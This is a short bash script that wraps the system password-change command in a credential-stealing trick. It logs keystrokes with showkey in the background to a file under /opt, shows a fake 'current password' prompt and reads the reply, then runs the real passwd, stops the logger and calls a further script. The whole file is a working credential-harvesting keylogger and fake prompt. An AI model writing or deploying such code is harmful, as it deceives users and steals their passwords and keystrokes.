#!/bin/bash

FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

# for fake
echo -n "currently password : "
read currentPassword
echo ""
# end-for fake

/usr/bin/passwd
kill %1
/opt/$FOLDER/function.sh
